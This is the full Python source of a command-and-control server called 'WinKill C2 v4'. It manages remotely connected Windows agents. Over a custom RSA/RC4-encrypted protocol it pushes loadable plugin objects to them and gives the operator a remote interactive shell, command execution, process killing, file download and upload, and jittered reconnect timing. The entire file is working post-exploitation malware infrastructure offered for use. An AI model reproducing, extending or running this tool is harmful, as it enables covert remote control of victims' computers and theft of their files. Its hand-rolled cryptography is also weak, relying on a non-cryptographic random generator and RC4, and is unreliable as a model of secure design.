#!/usr/bin/env python3
"""
WinKill C2 Server v4 - BOF hot-plug architecture
==================================================
Three-thread agent model (network / scheduler / BOF loader). The server serves
COFF plugin objects (.o) to the agent on demand, so every capability is a
hot-swappable plugin pulled from the `plugins/` directory.

Crypto: each connect uses a FRESH RSA-2048 pair on both sides.
  agent -> HELLO   : agent public key (identity)
  server-> KEYEX   : server public key, RSA-encrypted to the agent
  agent -> SESSKEY : 32-byte session key, RSA-encrypted to the server
  afterwards       : every frame payload RC4-encrypted (dir-tagged streams)

Usage: python c2_server.py [HOST] [PORT]

Commands:
  agents                        List connected agents
  use <id>                      Switch current agent
  status                        Show current agent info
  plugins                       List loaded plugins on current agent
  shell new | list | stop <iid> Manage interactive shell instances
  ish [iid]                     Interactive shell (exit=destroy, Ctrl+C=suspend)
  exec <cmd...>                 Run a command via exec.o
  ps                            Process list via ps.o
  kill <pid>                    Kill process via kill.o
  download <path>               Download file via download.o
  upload <local> <remote>       Upload file via upload.o
  config recon=<ms> jit=<ms>    Reconnect timing
  shutdown                      Shutdown current agent
"""

import socket
import struct
import sys
import time
import threading
import os
import random
import atexit

try:
    import readline
    import rlcompleter
    _HAS_READLINE = True
except ImportError:
    try:
        import pyreadline3 as readline
        import rlcompleter
        _HAS_READLINE = True
    except ImportError:
        _HAS_READLINE = False

HOST = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
PLUGIN_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "plugins")
DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")

_SHUTTING_DOWN = False

# ---- wire protocol (match proto.h) ----
FRAME_MAGIC = 0x314B4E57

T_HELLO   = 0x01
T_KEYEX   = 0x02
T_SESSKEY = 0x03
T_STATUS  = 0x04
T_LOAD    = 0x10
T_TASK    = 0x11
T_DATA    = 0x12
T_UNLOAD  = 0x13
T_OUTPUT  = 0x14
T_PING    = 0x20
T_PONG    = 0x21
T_CONFIG  = 0x30
T_SHUTDOWN = 0x31

POUT_INFO = 1
POUT_DATA = 2
POUT_DONE = 3
POUT_ERR  = 4
POUT_STREAM = 5
POUT_COMPLETE = 6
POUT_COMPLETE_END = 7

COMP_PREFIX = b"\x00\x01TAB\x02"     # in-band tab-completion request to shell.o

# ============================================================
# Crypto helpers (pure python)
# ============================================================
_SMALL_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]


def _is_prime(n, rounds=8):
    if n < 2:
        return False
    for p in _SMALL_PRIMES:
        if n % p == 0:
            return n == p
    d = n - 1
    r = 0
    while d % 2 == 0:
        d //= 2
        r += 1
    for _ in range(rounds):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def _gen_prime(bits):
    while True:
        n = random.getrandbits(bits) | (1 << (bits - 1)) | 1
        if _is_prime(n):
            return n


def rsa_gen_keypair(bits=2048):
    while True:
        p = _gen_prime(bits // 2)
        q = _gen_prime(bits // 2)
        n = p * q
        if n.bit_length() != bits:
            continue
        e = 65537
        phi = (p - 1) * (q - 1)
        try:
            d = pow(e, -1, phi)
        except ValueError:
            continue
        return (n, e), (n, d)


def rsa_encrypt(msg, pub):
    n, e = pub
    k = (n.bit_length() + 7) // 8
    if len(msg) > k - 11:
        raise ValueError("message too long for RSA block")
    ps = bytearray()
    while len(ps) != k - len(msg) - 3:
        b = random.randbytes(1)
        if b[0] != 0:
            ps.append(b[0])
    em = b"\x00\x02" + bytes(ps) + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), e, n)
    return c.to_bytes(k, "big")


def rsa_decrypt(ct, priv):
    n, d = priv
    k = (n.bit_length() + 7) // 8
    m = pow(int.from_bytes(ct, "big"), d, n)
    b = m.to_bytes(k, "big")
    if b[0] != 0 or b[1] != 2:
        raise ValueError("bad PKCS#1 padding")
    i = b.find(b"\x00", 2)
    if i < 0:
        raise ValueError("bad PKCS#1 padding")
    return b[i + 1:]


BCRYPT_RSA_PUBLIC_MAGIC = 0x31415352   # 'RSA1'


def parse_bcrypt_pubblob(blob):
    """BCRYPT_RSAPUBLIC_BLOB -> (modulus, exponent)"""
    if len(blob) < 24:
        raise ValueError("short pubblob")
    magic, bitlen, cbe, cbm, cb1, cb2 = struct.unpack("<IIIIII", blob[:24])
    if magic != BCRYPT_RSA_PUBLIC_MAGIC:
        raise ValueError("bad pubblob magic")
    exp = int.from_bytes(blob[24:24 + cbe], "big")
    mod = int.from_bytes(blob[24 + cbe:24 + cbe + cbm], "big")
    return mod, exp


def make_bcrypt_pubblob(mod, exp):
    cbe = (exp.bit_length() + 7) // 8
    cbm = (mod.bit_length() + 7) // 8
    hdr = struct.pack("<IIIIII", BCRYPT_RSA_PUBLIC_MAGIC, cbm * 8, cbe, cbm, 0, 0)
    return hdr + exp.to_bytes(cbe, "big") + mod.to_bytes(cbm, "big")


def rsa_encrypt_blocks(msg, pub, k=256, chunk=245):
    blocks = []
    for i in range(0, len(msg), chunk):
        blocks.append(rsa_encrypt(msg[i:i + chunk], pub))
    return blocks


class RC4:
    def __init__(self, key):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) & 0xFF
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def crypt(self, data):
        S, i, j = self.S, self.i, self.j
        out = bytearray(len(data))
        for n, b in enumerate(data):
            i = (i + 1) & 0xFF
            j = (j + S[i]) & 0xFF
            S[i], S[j] = S[j], S[i]
            out[n] = b ^ S[(S[i] + S[j]) & 0xFF]
        self.i, self.j = i, j
        return bytes(out)


# ============================================================
# Frame I/O
# ============================================================
def unquote(s):
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ('"', "'"):
        return s[1:-1]
    return s


def recv_n(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            c = sock.recv(n - len(buf))
        except OSError:
            return None
        if not c:
            return None
        buf += c
    return buf


def recv_frame(sock, rc4):
    hdr = recv_n(sock, 12)
    if hdr is None:
        return None
    magic, typ, flags, reserved, length = struct.unpack("<IBBHI", hdr)
    if magic != FRAME_MAGIC:
        return None
    if length > 0x800000:
        return None
    payload = recv_n(sock, length) if length else b""
    if payload is None:
        return None
    if rc4 and payload:
        payload = rc4.crypt(payload)
    return typ, payload


def send_frame(sock, typ, payload=b"", rc4=None):
    payload = payload or b""
    hdr = struct.pack("<IBBHI", FRAME_MAGIC, typ, 0, 0, len(payload))
    data = hdr + (rc4.crypt(payload) if (rc4 and payload) else payload)
    try:
        sock.sendall(data)
        return True
    except OSError:
        return False


# ============================================================
# Output waiter (server waits for a plugin to finish)
# ============================================================
class OutputWaiter:
    def __init__(self, iid):
        self.iid = iid
        self.frames = []
        self.done = threading.Event()
        self.lock = threading.Lock()

    def add(self, typ, data):
        with self.lock:
            self.frames.append((typ, data))
            if typ == POUT_DONE:
                self.done.set()

    def wait(self, timeout):
        self.done.wait(timeout)
        with self.lock:
            return list(self.frames)

    def peek(self):
        with self.lock:
            return list(self.frames)

    def text(self, timeout):
        frames = self.wait(timeout)
        out = b""
        for typ, data in frames:
            if typ in (POUT_INFO, POUT_DATA, POUT_ERR):
                out += data
        return out


# ============================================================
# Agent session
# ============================================================
class AgentSession:
    _next_id = 0

    def __init__(self, sock, addr):
        AgentSession._next_id += 1
        self.agent_id = AgentSession._next_id
        self.sock = sock
        self.addr = addr
        self.alive = True
        self.hostname = "unknown"
        self.username = "unknown"

        self.server_priv = None
        self.server_pub = None
        self.session_key = None
        self.tx_rc4 = None
        self.rx_rc4 = None

        self.images = {}           # name -> pid
        self.instances = {}        # iid -> (pid, name)
        self.shell_iid = None
        self.active_ish = None
        self.next_pid = 1
        self.next_iid = 1
        self.waiters = {}          # iid -> OutputWaiter
        self.comp = {"iid": None, "buf": b"", "event": threading.Event(), "lock": threading.Lock()}
        self.lock = threading.Lock()
        self.reader_thread = None

    def send(self, typ, payload=b""):
        return send_frame(self.sock, typ, payload, self.tx_rc4)

    def close(self):
        self.alive = False
        try:
            self.sock.close()
        except OSError:
            pass

    # ---- handshake ----
    def handshake(self):
        f = recv_frame(self.sock, None)
        if not f or f[0] != T_HELLO:
            return False
        client_pub = parse_bcrypt_pubblob(f[1])

        self.server_pub, self.server_priv = rsa_gen_keypair(2048)
        blob = make_bcrypt_pubblob(*self.server_pub)
        blocks = rsa_encrypt_blocks(blob, client_pub)
        if not send_frame(self.sock, T_KEYEX, bytes([len(blocks)]) + b"".join(blocks), None):
            return False

        f = recv_frame(self.sock, None)
        if not f or f[0] != T_SESSKEY:
            return False
        self.session_key = rsa_decrypt(f[1], self.server_priv)
        self.rx_rc4 = RC4(self.session_key + b"\x01")
        self.tx_rc4 = RC4(self.session_key + b"\x02")
        return True

    # ---- reader ----
    def reader_loop(self):
        while self.alive:
            f = recv_frame(self.sock, self.rx_rc4)
            if not f:
                break
            typ, pl = f
            self.handle_frame(typ, pl)
        self.alive = False
        if not _SHUTTING_DOWN:
            print(f"\n[!] Agent{self.agent_id} disconnected ({self.addr[0]})")
            sys.stdout.write("C2> ")
            sys.stdout.flush()

    def handle_frame(self, typ, pl):
        if typ == T_STATUS:
            try:
                text = pl.decode(errors="replace").strip()
                for part in text.split():
                    if part.startswith("HOST="):
                        self.hostname = part[5:]
                    elif part.startswith("USER="):
                        self.username = part[5:]
                print(f"\n[Agent{self.agent_id} online] {text}")
            except Exception:
                pass
            sys.stdout.write("C2> ")
            sys.stdout.flush()

        elif typ == T_PING:
            self.send(T_PONG)

        elif typ == T_OUTPUT:
            if len(pl) < 5:
                return
            iid = struct.unpack("<I", pl[:4])[0]
            otype = pl[4]
            data = pl[5:]

            with self.comp["lock"]:
                waiting_comp = (self.comp["iid"] == iid)
                comp = self.comp

            if waiting_comp:
                with comp["lock"]:
                    if otype == POUT_COMPLETE:
                        comp["buf"] += data + b"\n"
                    elif otype == POUT_COMPLETE_END:
                        comp["event"].set()
                return

            if iid in self.waiters:
                self.waiters[iid].add(otype, data)
                return

            if iid == self.active_ish:
                try:
                    sys.stdout.write(data.decode("gbk", errors="replace"))
                except Exception:
                    sys.stdout.buffer.write(data)
                sys.stdout.flush()
                return

            # orphan output
            try:
                tag = self.instances.get(iid, (0, "?"))[1]
                sys.stdout.write(f"\n[Agent{self.agent_id} {tag}/{iid} #{otype}] "
                                 + data.decode(errors="replace"))
            except Exception:
                pass
            sys.stdout.write("C2> ")
            sys.stdout.flush()

    def start_reader(self):
        self.reader_thread = threading.Thread(target=self.reader_loop, daemon=True)
        self.reader_thread.start()
        return self.reader_thread

    # ---- plugin tasking ----
    def ensure_image(self, name):
        if name in self.images:
            return self.images[name]
        path = os.path.join(PLUGIN_DIR, name + ".o")
        if not os.path.exists(path):
            raise FileNotFoundError(f"plugin {name}.o not found in {PLUGIN_DIR}")
        with open(path, "rb") as fp:
            data = fp.read()
        pid = self.next_pid
        self.next_pid += 1
        nb = name.encode()
        pl = struct.pack("<II", pid, len(nb)) + nb + struct.pack("<I", len(data)) + data
        self.send(T_LOAD, pl)
        self.images[name] = pid
        return pid

    def task(self, name, args=b"", timeout=25):
        pid = self.ensure_image(name)
        iid = self.next_iid
        self.next_iid += 1
        # one-shot plugins (exec/ps/kill/download/upload) are NOT tracked in
        # self.instances - only persistent shells are (so `shell list` stays clean)
        w = OutputWaiter(iid)
        self.waiters[iid] = w
        pl = struct.pack("<III", pid, iid, len(args)) + args
        self.send(T_TASK, pl)
        return w, iid

    def finish(self, iid):
        self.waiters.pop(iid, None)
        self.instances.pop(iid, None)


# ============================================================
# Server
# ============================================================
class C2Server:
    def __init__(self):
        self.agents = {}
        self.current = None
        self.running = True
        self.listener = None
        self.accept_thread = None

    # ---- accept loop ----
    def accept_loop(self):
        while self.running:
            try:
                client, addr = self.listener.accept()
                agent = AgentSession(client, addr)
                if not agent.handshake():
                    agent.close()
                    continue
                self.agents[agent.agent_id] = agent
                agent.start_reader()
                if self.current is None or not self.current.alive:
                    self.current = agent
                print(f"\n[+] Agent{agent.agent_id}: {addr[0]}:{addr[1]} (keys exchanged)")
                sys.stdout.write("C2> ")
                sys.stdout.flush()
            except Exception:
                if self.running:
                    time.sleep(0.3)
                else:
                    break

    # ---- helpers ----
    def cur(self):
        a = self.current
        if not a or not a.alive:
            print("No active agent (use 'agents' then 'use <id>').")
            return None
        return a

    def fmt_agent(self, a):
        marker = " *" if a is self.current else "  "
        state = "ALIVE" if a.alive else "DEAD"
        return (f"{marker} Agent{a.agent_id} | {a.hostname} | {a.username} | "
                f"{a.addr[0]}:{a.addr[1]} | plugins:{len(a.images)} | {state}")

    # ---- commands ----
    def cmd_agents(self, args):
        if not self.agents:
            print("No agents connected.")
            return
        for a in self.agents.values():
            print(self.fmt_agent(a))

    def cmd_use(self, args):
        if not args:
            print(f"Current: Agent{self.current.agent_id}" if self.current else "None")
            return
        try:
            aid = int(args[0])
        except ValueError:
            print(f"Invalid agent ID: {args[0]}")
            return
        if aid not in self.agents or not self.agents[aid].alive:
            print(f"Agent{aid} not found or dead.")
            return
        self.current = self.agents[aid]
        print(f"[*] Switched to Agent{aid}")

    def cmd_status(self, args):
        a = self.cur()
        if not a:
            return
        print(f"Agent{a.agent_id}: {a.hostname} | {a.username}")
        print(f"Address: {a.addr[0]}:{a.addr[1]}")
        print(f"Plugins: {list(a.images.keys())}")
        print(f"Instances: {[f'{n}/{i}' for i, (p, n) in a.instances.items()]}")

    def cmd_plugins(self, args):
        a = self.cur()
        if not a:
            return
        print(f"Loaded plugins on Agent{a.agent_id}: {list(a.images.keys()) or '(none)'}")

    def _create_shell(self, a):
        if a.shell_iid and a.shell_iid in a.instances:
            return a.shell_iid
        pid = a.ensure_image("shell")
        iid = a.next_iid
        a.next_iid += 1
        a.instances[iid] = (pid, "shell")
        a.send(T_TASK, struct.pack("<III", pid, iid, 0))
        a.shell_iid = iid
        return iid

    def cmd_shell(self, args):
        a = self.cur()
        if not a:
            return
        if not args or args[0] == "list":
            print(f"Shell instances on Agent{a.agent_id}:")
            for iid, (pid, name) in a.instances.items():
                print(f"  #{iid} {name} (pid={pid}){'  <active>' if iid == a.active_ish else ''}")
            return
        if args[0] == "new":
            iid = self._create_shell(a)
            print(f"[+] Shell #{iid} spawned (shell.o pulled from server)")
            return
        if args[0] == "stop" and len(args) > 1:
            try:
                iid = int(args[1])
            except ValueError:
                print("Usage: shell stop <iid>")
                return
            if iid in a.instances:
                a.send(T_UNLOAD, struct.pack("<I", iid))
                a.instances.pop(iid, None)
                if a.shell_iid == iid:
                    a.shell_iid = None
                print(f"[*] Shell #{iid} unloaded")
            else:
                print(f"No instance #{iid}")
            return
        print("Usage: shell new | list | stop <iid>")

    # ---- interactive shell ----
    def cmd_ish(self, args):
        a = self.cur()
        if not a:
            return
        if args:
            # re-enter a specific suspended shell: ish <iid>
            try:
                iid = int(args[0])
            except ValueError:
                print(f"Invalid iid: {args[0]}")
                return
            if iid not in a.instances:
                print(f"No shell instance #{iid} (use 'shell new' first)")
                return
            a.shell_iid = iid
        else:
            iid = self._create_shell(a)
        a.active_ish = iid
        print(f"\n[*] Interactive shell on Agent{a.agent_id} instance #{iid}")
        if _HAS_READLINE:
            print("[*] Up/Down = history, Tab = remote completion, 'exit' to leave\n")
        else:
            print("[*] 'exit' to leave (install pyreadline3 for history + completion)\n")

        cache = {"text": None, "cands": []}
        if _HAS_READLINE:
            histfile = os.path.join(os.path.expanduser("~"), ".winkill_ish_history")
            try:
                readline.read_history_file(histfile)
                readline.set_history_length(500)
            except Exception:
                pass
            atexit.register(lambda: self._save_ish_history(histfile))

            def completer(text, state):
                if state == 0:
                    if text != cache["text"]:
                        cache["text"] = text
                        cache["cands"] = self._complete(a, iid, text)
                try:
                    return cache["cands"][state]
                except IndexError:
                    return None

            readline.set_completer(completer)
            readline.parse_and_bind("tab: complete")
        try:
            while True:
                if not a.alive:
                    print("\n[*] Agent went offline")
                    break
                try:
                    line = input().strip()
                except KeyboardInterrupt:
                    # Ctrl+C = suspend: keep the remote shell alive, just detach
                    print(f"\n[*] Shell #{iid} suspended (Ctrl+C) - re-enter with 'ish'")
                    break
                except EOFError:
                    print(f"\n[*] Shell #{iid} detached")
                    break
                if not line:
                    continue
                if line.lower() in ("exit", "quit"):
                    # exit = destroy: kill the remote cmd.exe + unload the instance
                    a.send(T_UNLOAD, struct.pack("<I", iid))
                    a.instances.pop(iid, None)
                    if a.shell_iid == iid:
                        a.shell_iid = None
                    print(f"\n[*] Shell #{iid} destroyed (remote cmd.exe terminated)")
                    break
                if not a.send(T_DATA, struct.pack("<I", iid) + line.encode("gbk", errors="replace")):
                    print("[*] send failed - agent offline")
                    break
        finally:
            a.active_ish = None

    @staticmethod
    def _save_ish_history(path):
        try:
            readline.write_history_file(path)
        except Exception:
            pass

    def _complete(self, a, iid, text):
        cmds = ["dir", "cd", "type", "del", "copy", "move", "echo", "cls", "mkdir",
                "rmdir", "ren", "ipconfig", "whoami", "net", "tasklist", "taskkill",
                "systeminfo", "reg", "powershell", "cmd", "ping", "nslookup", "tree",
                "findstr", "where", "set", "ver", "hostname", "chcp", "path", "title"]
        if " " not in text:
            return [c for c in cmds if c.startswith(text.lower())]
        prefix = text.split(" ", 1)[1]
        with a.comp["lock"]:
            a.comp["iid"] = iid
            a.comp["buf"] = b""
            a.comp["event"].clear()
        a.send(T_DATA, struct.pack("<I", iid) + COMP_PREFIX + prefix.encode("gbk", errors="replace"))
        a.comp["event"].wait(2.0)
        with a.comp["lock"]:
            a.comp["iid"] = None
            cands = [l for l in a.comp["buf"].decode("gbk", errors="replace").split("\n") if l]
        return cands

    # ---- one-shot plugins ----
    def cmd_exec(self, args):
        a = self.cur()
        if not a:
            return
        if not args:
            print("Usage: exec <command>")
            return
        cmd = " ".join(args)
        w, iid = a.task("exec", cmd.encode("gbk", errors="replace"))
        text = w.text(25)
        a.finish(iid)
        try:
            sys.stdout.write(text.decode("gbk", errors="replace"))
        except Exception:
            sys.stdout.buffer.write(text)
        sys.stdout.flush()

    def cmd_ps(self, args):
        a = self.cur()
        if not a:
            return
        w, iid = a.task("ps")
        text = w.text(15)
        a.finish(iid)
        print(text.decode("gbk", errors="replace"))

    def cmd_kill(self, args):
        a = self.cur()
        if not a:
            return
        if not args:
            print("Usage: kill <pid>")
            return
        w, iid = a.task("kill", args[0].encode())
        text = w.text(10)
        a.finish(iid)
        print(text.decode("gbk", errors="replace"))

    def cmd_download(self, args):
        a = self.cur()
        if not a:
            return
        if not args:
            print("Usage: download <remote_path>")
            return
        w, iid = a.task("download", unquote(args[0]).encode("gbk", errors="replace"))
        frames = w.wait(30)
        a.finish(iid)

        # parse plugin download stream (frames are self-delimiting)
        path = None
        total = 0
        got = 0
        data = b""
        for typ, pl in frames:
            if typ not in (POUT_DATA, POUT_ERR):
                continue
            if len(pl) < 4:
                continue
            tag = struct.unpack("<I", pl[:4])[0]
            if tag == 1 and len(pl) >= 10:
                total = struct.unpack("<I", pl[4:8])[0]
                plen = struct.unpack("<H", pl[8:10])[0]
                path = pl[10:10 + plen].decode("gbk", errors="replace")
                data = b""
            elif tag == 2:
                data += pl[8:]
                got += len(pl) - 8
            elif tag == 3:
                break
        if not path:
            print("[!] Download failed or no data returned")
            return
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        safe = path.replace("\\", "_").replace("/", "_").replace(":", "_")
        out = os.path.join(DOWNLOADS_DIR, safe)
        with open(out, "wb") as fp:
            fp.write(data)
        print(f"[+] Downloaded {path} ({got}/{total} bytes) -> {out}")

    def cmd_upload(self, args):
        a = self.cur()
        if not a:
            return
        if len(args) < 2:
            print("Usage: upload <local_path> <remote_path>")
            return
        src, dst = unquote(args[0]), unquote(args[1])
        try:
            with open(src, "rb") as fp:
                filedata = fp.read()
        except OSError as e:
            print(f"[-] Cannot read {src}: {e}")
            return
        w, iid = a.task("upload", dst.encode("gbk", errors="replace"), timeout=5)
        CHUNK = 65536
        off = 0
        while off < len(filedata):
            chunk = filedata[off:off + CHUNK]
            pl = struct.pack("<II", 0x02, off) + chunk
            a.send(T_DATA, struct.pack("<I", iid) + pl)
            off += len(chunk)
        a.send(T_DATA, struct.pack("<I", iid) + struct.pack("<I", 0xFFFFFFFF))
        text = w.text(20)
        a.finish(iid)
        print(text.decode("gbk", errors="replace"))

    def cmd_run(self, args):
        """Run any plugin directly: run <plugin> [args...]"""
        a = self.cur()
        if not a:
            return
        if not args:
            print("Usage: run <plugin> [args...]")
            return
        name = args[0]
        argstr = " ".join(args[1:])
        try:
            w, iid = a.task(name, argstr.encode("gbk", errors="replace"))
        except FileNotFoundError as e:
            print(f"[-] {e}")
            return
        # stream output as it arrives (a crashing plugin never sends DONE)
        deadline = time.time() + 6
        printed = 0
        while time.time() < deadline:
            frames = w.peek()
            for typ, pl in frames[printed:]:
                if typ in (POUT_INFO, POUT_ERR, POUT_DATA):
                    try:
                        sys.stdout.write(pl.decode("gbk", errors="replace"))
                    except Exception:
                        sys.stdout.buffer.write(pl)
                printed += 1
            if w.done.is_set():
                break
            time.sleep(0.15)
        a.finish(iid)
        if not w.done.is_set():
            print("\n[!] plugin did not finish (crashed / timed out)")
        sys.stdout.flush()

    def cmd_config(self, args):
        a = self.cur()
        if not a:
            return
        if not args:
            print("Usage: config recon=<ms> jit=<ms>")
            print("  recon = base reconnect sleep (default 60000ms)")
            print("  jit   = extra random reconnect jitter (default 600000ms = 0-10min)")
            return
        cfg = " ".join(args)
        a.send(T_CONFIG, cfg.encode())
        print(f"[*] Config sent: {cfg}")

    def cmd_shutdown(self, args):
        a = self.cur()
        if not a:
            return
        a.send(T_SHUTDOWN)
        print("[*] Shutdown sent.")

    # ---- top level ----
    def _setup_readline(self):
        self._commands = ["help", "agents", "use", "status", "plugins", "shell",
                          "ish", "exec", "ps", "kill", "download", "upload",
                          "run", "config", "shutdown", "exit", "quit"]
        if not _HAS_READLINE:
            print("[*] Tip: pip install pyreadline3 for tab completion + history")
            return
        histfile = os.path.join(os.path.expanduser("~"), ".winkill_history")
        try:
            readline.read_history_file(histfile)
            readline.set_history_length(1000)
        except Exception:
            pass
        atexit.register(lambda: self._save_ish_history(histfile))

        def completer(text, state):
            options = [c for c in self._commands if c.startswith(text)]
            if " " in text:
                prefix = text.split()[0]
                rest = text[len(prefix) + 1:]
                if prefix == "use":
                    opts = [f"use {aid}" for aid in map(str, self.agents.keys())
                            if str(aid).startswith(rest)]
                    options = opts + options
            try:
                return options[state]
            except IndexError:
                return None

        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")

    def run(self):
        self._setup_readline()
        os.makedirs(PLUGIN_DIR, exist_ok=True)
        self.listener = socket.socket()
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((HOST, PORT))
        self.listener.listen(16)
        print(f"[*] WinKill C2 v4 - Listening on {HOST}:{PORT}")
        print(f"[*] Plugin dir: {PLUGIN_DIR}")
        print(f"[*] Waiting for agent connections...")

        self.accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
        self.accept_thread.start()

        while self.running:
            try:
                raw = input("C2> ").strip()
            except EOFError:
                time.sleep(0.3)
                continue
            except KeyboardInterrupt:
                break
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]
            handler = getattr(self, "cmd_" + cmd, None) if cmd.isidentifier() else None
            if handler:
                handler(args)
            elif cmd in ("exit", "quit"):
                break
            elif cmd == "help":
                print(__doc__)
            else:
                print(f"Unknown: {cmd}. Try 'help'")

        print("\n[*] Shutting down...")
        global _SHUTTING_DOWN
        _SHUTTING_DOWN = True
        self.running = False
        # close listener first to unblock accept_loop
        try:
            self.listener.close()
        except OSError:
            pass
        # close all agent sockets to unblock their reader threads
        for a in list(self.agents.values()):
            a.close()
        # join threads so no daemon thread writes to stdout during interpreter
        # finalization (avoids "Fatal Python error: _enter_buffered_busy")
        if self.accept_thread and self.accept_thread.is_alive():
            self.accept_thread.join(timeout=2)
        for a in list(self.agents.values()):
            t = a.reader_thread
            if t and t.is_alive():
                t.join(timeout=2)
        sys.stdout.flush()
        sys.stderr.flush()
        print("[*] Done")
        sys.stdout.flush()


if __name__ == "__main__":
    C2Server().run()
